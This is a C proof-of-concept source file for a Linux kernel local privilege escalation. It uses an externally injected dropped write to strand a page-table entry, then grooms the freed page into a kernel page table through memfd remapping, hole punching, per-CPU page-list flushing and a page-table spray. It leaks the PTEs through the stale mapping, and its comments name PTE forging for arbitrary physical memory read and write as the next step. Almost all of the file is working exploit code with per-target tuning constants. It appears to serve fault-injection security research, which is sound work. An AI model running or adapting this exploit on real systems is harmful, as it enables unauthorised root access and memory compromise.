/*

Dropped-write "Dirty Pagetable" LPE, unprivileged, faults injected EXTERNALLY
(EMFI / the qemu mem-scan sim -- NOT the dropwrite LKM, NO cheats).

Two phases:

  Phase 1 -- trigger (unchanged idea from the original PoC):
    Map memfd A a bunch of times, then MAP_FIXED-remap each over the same
    address to memfd B (updating <2MiB at a time so the L2 pte-page doesn't
    move). During the remap the kernel rewrites the leaf PTEs; if an external
    dropped write lands on one of those PTE stores, the PTE keeps pointing at
    A's page while its VMA now points at B. We scan for that: a probe that
    still reads A's magic after the remap to B == a stale PTE. `dangle` is that
    address; the stale page X is B's page at `dangle_off`.

  Phase 2 -- groom X into a page table (Dirty Pagetable):
    1. free X: fallocate(PUNCH_HOLE) on B at dangle_off -> X onto movable pcp.
    2. flush X pcp->buddy the unprivileged way: a big filler STAYS mapped so
       movable memory is exhausted (X becomes ~the only movable free page),
       while munmap'ing a small filler overflows the movable pcp `high`
       watermark and drains the list (incl. X) into the buddy free area.
    3. spray pte-pages: map a pre-cached SHARED memfd at many fresh addresses.
       Each mapping needs its own leaf pte-page (UNMOVABLE) but reuses cached
       data pages (no competing movable alloc). This drains the unmovable
       freelist; the fallback then steals the lone movable free page X and
       hands it back as a pte-page.
    4. read the kernel PTEs through the stale mapping `dangle` and print them.
       (Next step toward LPE: WRITE dangle to forge a PTE -> arbitrary phys R/W.)

We decide "X is a page table" by scanning the stale mapping for PTE-shaped entries

Grooming constants below are tuned for a small (~512 MB, >=2 CPU) guest; retune
PREFILL/FLUSH/spray budget and MAP_COUNT for the target's RAM.

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>

#define FOUR_KB 0x1000
#define ONE_MB 0x100000
#define MEMFD_SIZE (2 * ONE_MB)
#define PROBE_STRIDE (8 * FOUR_KB)
#define MAP_COUNT (1024 * 16)  // PTEs should exceed L3

/* grooming tunables (per-target RAM) */
#define MAGIC_F      0xf00df00du /* spray-file marker; its pfns show up in PTEs */
#define PREFILL_MB   256         /* big filler: STAYS mapped -> keeps movable free
				    pool drained so X is ~the only movable free page */
#define FLUSH_MB     8           /* small filler: munmap'd to overflow the movable
				    pcp `high` watermark and flush X pcp->buddy */
#define SPRAY_MAPS   60000       /* pte-page mappings to attempt (OOM-breaks earlier) */
#define SPRAY_TOUCH  64          /* pages faulted per mapping (1 pte-page, 64 set-PTEs) */
#define SCAN_EVERY   256         /* scan cadence */

void *maps[MAP_COUNT];

void hexdump(void *addr, size_t len) {
	uint8_t *buf = (uint8_t *)addr;
	for (size_t i = 0; i < len; i += 16) {
		printf("%p:  ", &buf[i]);
		for (size_t j = 0; j < 16 && (i + j < len); j++)
			printf("%02x ", buf[i+j]);
		printf("\n");
	}
}

void swap_int(int *a, int *b) {
	int tmp = *a; *a = *b; *b = tmp;
}

/* count PTE-shaped entries (present|user, plausible pfn) */
static int count_ptes(volatile uint64_t *page) {
	int hits = 0;
	for (int i = 0; i < 512; i++) {
		uint64_t e = page[i];
		uint64_t pfn = (e >> 12) & 0xffffffffffULL;
		if ((e & 1) && (e & 4) && pfn > 0x100 && pfn < 0x40000)
			hits++;
	}
	return hits;
}

/* memfd of MEMFD_SIZE filled with `magic` at every page start */
static int mk_spray_src(uint32_t magic) {
	int fd = memfd_create("spray", MFD_CLOEXEC);
	if (fd < 0 || ftruncate(fd, MEMFD_SIZE)) { perror("spray memfd"); return -1; }
	for (off_t o = 0; o < MEMFD_SIZE; o += FOUR_KB) {
		lseek(fd, o, SEEK_SET);
		if (write(fd, &magic, 4) != 4) { perror("spray write"); return -1; }
	}
	return fd;
}

int main()
{
	setbuf(stdout, NULL);

	/* Pin to CPU 1, not 0: CPU 0 is the noisiest core (default IRQ affinity,
	 * timer/housekeeping), so its per-CPU pageset churns the most. A quieter
	 * CPU's pcp list makes the pcp->buddy flush of X more deterministic. The
	 * external fault injector is CPU-agnostic, so pinning doesn't affect it. */
	cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
	if (sched_setaffinity(0, sizeof set, &set)) perror("setaffinity");

	printf("hello\n");

	int mfd_a, mfd_b, mfd_c;
	int magic_a = 0xdeadbeef, magic_b = 0xcafebabe;

	mfd_a = memfd_create("hax_a", MFD_CLOEXEC);
	if (mfd_a < 0) { perror("memfd_create"); return -1; }
	mfd_b = memfd_create("hax_b", MFD_CLOEXEC);
	if (mfd_b < 0) { perror("memfd_create"); return -1; }
	mfd_c = memfd_create("hax_c", MFD_CLOEXEC);
	if (mfd_c < 0) { perror("memfd_create"); return -1; }

	if (ftruncate(mfd_a, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }
	if (ftruncate(mfd_b, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }
	if (ftruncate(mfd_c, MEMFD_SIZE) != 0) { perror("ftruncate"); return -1; }

	// populate the memfds with recognizeable values
	for (size_t i = 0; i < MEMFD_SIZE; i += PROBE_STRIDE) {
		assert(lseek(mfd_a, i, SEEK_SET) >= 0);
		assert(write(mfd_a, &magic_a, sizeof(magic_a)) == sizeof(magic_a));
		assert(lseek(mfd_b, i, SEEK_SET) >= 0);
		assert(write(mfd_b, &magic_b, sizeof(magic_b)) == sizeof(magic_b));
	}

	// create some full 2MiB mappings to begin with
	for (size_t i = 0; i < MAP_COUNT; i++) {
		maps[i] = mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_POPULATE, mfd_c, 0);
		if (maps[i] == MAP_FAILED) { perror("mmap"); return -1; }
	}
	printf("initial mmap complete\n");

	// ===== Phase 1: wait for an external dropped write to strand a PTE =====
	uintptr_t dangle = 0;
	size_t dangle_off = 0;
	size_t dangle_idx = 0;
	for (;;) {
		swap_int(&mfd_a, &mfd_b);
		swap_int(&magic_a, &magic_b);

		for (size_t i = 0; i < MAP_COUNT; i++) {
			void *res = mmap(maps[i], MEMFD_SIZE - FOUR_KB,
					 PROT_READ | PROT_WRITE,
					 MAP_SHARED | MAP_FIXED | MAP_POPULATE, mfd_a, 0);
			if (res == MAP_FAILED) { perror("mmap"); return -1; }
		}

		for (size_t i = 0; i < MAP_COUNT && !dangle; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += PROBE_STRIDE) {
				int probed = *(int *)((uint8_t *)(maps[i]) + j);
				if (probed != magic_a && probed == magic_b) {
					printf("w00t!!!!!! dropped write!!!\n");
					dangle = (uintptr_t)((uint8_t *)(maps[i]) + j);
					dangle_off = j;
					dangle_idx = i;
					break;
				}
			}
		}
		if (dangle) break;
		printf("probed\n");
	}

	printf("stale PTE @ %p (mfd_b page, off 0x%zx)\n", (void *)dangle, dangle_off);
	hexdump((void *)dangle, 0x40);

	// ===== Phase 2: groom the freed page X into a leaf page table =====

	/* Reclaim the trigger scaffolding to give grooming room, but KEEP the
	 * mapping that carries the stale PTE (its leaf pte-page must survive). */
	for (size_t i = 0; i < MAP_COUNT; i++) {
		if (i == dangle_idx) continue;
		munmap(maps[i], MEMFD_SIZE - FOUR_KB);
	}
	close(mfd_c);

	/* spray source: a shared memfd cached once, so re-mapping it faults in
	 * pte-pages without allocating fresh (movable) data pages. */
	int f = mk_spray_src(MAGIC_F);
	if (f < 0) return -1;
	if (mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_POPULATE, f, 0) == MAP_FAILED) {
		perror("cache F"); return -1;
	}

	/* big filler exhausts movable free (STAYS mapped); small flusher is freed
	 * below only to overflow the pcp and flush X to buddy. */
	size_t fill = (size_t)PREFILL_MB * ONE_MB;
	char *filler = mmap(NULL, fill, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (filler == MAP_FAILED) { perror("prefill"); return -1; }
	madvise(filler, fill, MADV_NOHUGEPAGE);
	for (size_t o = 0; o < fill; o += FOUR_KB) filler[o] = 1;

	size_t flush = (size_t)FLUSH_MB * ONE_MB;
	char *flusher = mmap(NULL, flush, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (flusher == MAP_FAILED) { perror("flusher"); return -1; }
	madvise(flusher, flush, MADV_NOHUGEPAGE);
	for (size_t o = 0; o < flush; o += FOUR_KB) flusher[o] = 1;
	printf("filled %d MB movable (+%d MB flusher)\n", PREFILL_MB, FLUSH_MB);

	/* free X: punch it out of B's page cache -> onto the movable pcp list */
	if (fallocate(mfd_b, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
		      dangle_off, FOUR_KB)) {
		perror("punch"); return -1;
	}
	printf("freed X\n");

	/* flush X pcp->buddy: freeing the flusher overflows the movable pcp
	 * `high` watermark -> free_pcppages_bulk drains the list (incl. X) into
	 * the buddy free area, where an unmovable fallback steal can reach it.
	 * The big filler stays mapped, so X is ~the only movable free page. */
	munmap(flusher, flush);

	/* drain the unmovable freelist -> fallback steals X's movable block and
	 * hands it back as a pte-page mapping F's cached pages. */
	volatile uint64_t *stale = (volatile uint64_t *)dangle;
	for (int k = 0; k < SPRAY_MAPS; k++) {
		char *m = mmap(NULL, MEMFD_SIZE, PROT_READ | PROT_WRITE,
			       MAP_SHARED, f, 0);
		if (m == MAP_FAILED) {
			printf("spray mmap failed at k=%d\n", k);
			break;
		}
		for (int t = 0; t < SPRAY_TOUCH; t++)
			(void)((volatile char *)m)[t * FOUR_KB];

		if ((k % SCAN_EVERY) == 0) {
			int n = count_ptes(stale);
			if (n > 16) {
				printf("[+] PAGE TABLE IN THE HOLE at k=%d (%d PTEs)\n",
				       k, n);
				printf("leaked PTEs via stale mapping %p:\n", (void *)dangle);
				for (int i = 0; i < 512; i++) {
					uint64_t e = stale[i];
					if (e)
						printf("  pte[%3d] = 0x%016llx  (pfn 0x%llx)\n",
						       i, (unsigned long long)e,
						       (unsigned long long)((e >> 12) & 0xffffffffffULL));
				}
				return 0;
			}
		}
	}

	printf("[-] no pte-page reclaim within budget\n");
	return 1;
}
